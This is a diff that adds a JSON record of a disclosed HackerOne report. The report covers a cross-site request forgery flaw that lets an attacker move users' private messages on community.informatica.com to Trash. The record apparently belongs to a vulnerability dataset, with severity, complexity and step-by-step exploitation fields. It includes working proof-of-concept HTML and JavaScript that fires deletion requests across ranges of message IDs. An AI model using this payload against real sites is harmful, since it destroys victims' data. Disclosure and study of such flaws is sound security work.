@@ -1,0 +1,46 @@
+{
+    "reported_to": "Informatica",
+    "reported_by": "artem ",
+    "title": "[community.informatica.com] - CSRF in Private Messages allows to move user's messages to Trash",
+    "content": "\nHello,\nhttps://community.informatica.com/pm-delete.jspa doesn't check Referrer header or CSRF token when you move a message to Trash. As a result, an attacker can implement CSRF attack, and make a victim move messages to Trash. Then, according to the message on Trash page (https://community.informatica.com/pm.jspa?folderID=4), Trash is emptied daily. So a victim can lose messages.\nTo remove a message, an attacker needs to know a message ID. Message IDs seem to be global, so an attacker can do the following:\nguess the current max message ID (for example, an attacker can send a message to yourself, and use this message ID)\ntry to remove N messages with IDs that belong to an interval [max_message_id - N, max_message_id]\nFor example, a script like the following may be placed on attacker's page:\nCode 429 Bytes\n1<html>\n2 <body>\n3  <div id=\"delete\"></div>\n4  <script>\n5   var start_message_id = 16000;\n6   var message_count = 100;\n7   var text = \"\";\n8   var message_id = start_message_id;\n9   for (i = 0; i < message_count; i++) {\n10     text += \"<img src=\\\"https://community.informatica.com/pm-delete.jspa?1&messageID=\" + message_id + \"\\\"\\/>\";\n11     message_id++;\n12   }\n13   document.getElementById(\"delete\").innerHTML = text;\n14  </script>\n15 </body>\n16</html>\nWhen a victim loads the page above, the script will remove messages with IDs from 16000 to 16100. The script above sends a GET request for each possible message. As a result, it works quite slow. So it might be hard to remove all users messages because a victim should stay on the page before the script is finished.\nI tried to modify the script above to send a request for a batch of messages:\nCode 521 Bytes\n1<script>\n2   var start_message_id = 15900;\n3   var message_count = 200;\n4   var N = 1;\n5   var text = \"<img src=\\\"https://community.informatica.com/pm-delete.jspa?1\";\n6   var message_id = start_message_id;\n7   for (i = 0; i < message_count; i++) {\n8     text += \"&messageID=\" + message_id;\n9     if (i != 0 && i % N == 0) {\n10       text += \"\\\"\\/>\";\n11       document.getElementById(\"delete\").innerHTML += text;\n12       text = \"<img src=\\\"https://community.informatica.com/pm-delete.jspa?1\";\n13     }\n14     message_id++;\n15   }\n16  </script>\nBut it doesn't seem to work fine. Seems the application stops removing if it finds not existing message ID.\nAnyway, it can damage user's data a lot. Please take a look.\nArtem\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-Site Request Forgery (CSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1456904760,
+    "report_url": "https://hackerone.com/reports/45050",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Identify the target URL (https://community.informatica.com/pm-delete.jspa) that lacks CSRF protection."
+        ],
+        [
+            2,
+            "Create a malicious HTML page that includes a script to send GET requests to the target URL with guessed message IDs."
+        ],
+        [
+            3,
+            "Trick a victim into visiting the malicious page, which will automatically send requests to delete messages."
+        ],
+        [
+            4,
+            "Observe that the victim's messages are moved to Trash and will be permanently deleted when Trash is emptied daily."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a CSRF (Cross-Site Request Forgery) flaw in the private message deletion functionality of the Informatica community site. The site does not validate the Referer header or use CSRF tokens, allowing an attacker to craft a malicious page that, when visited by a victim, sends requests to delete messages. The attacker can guess message IDs to target specific or a range of messages, potentially causing the victim to lose important data when the Trash is emptied.",
+    "reason": "The attack involves understanding CSRF vulnerabilities and how to exploit them, as well as the need to guess or estimate message IDs. However, the steps to exploit this vulnerability are straightforward once the lack of CSRF protection is identified, and the interaction between components (malicious page and victim's session) is a common pattern in CSRF attacks.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
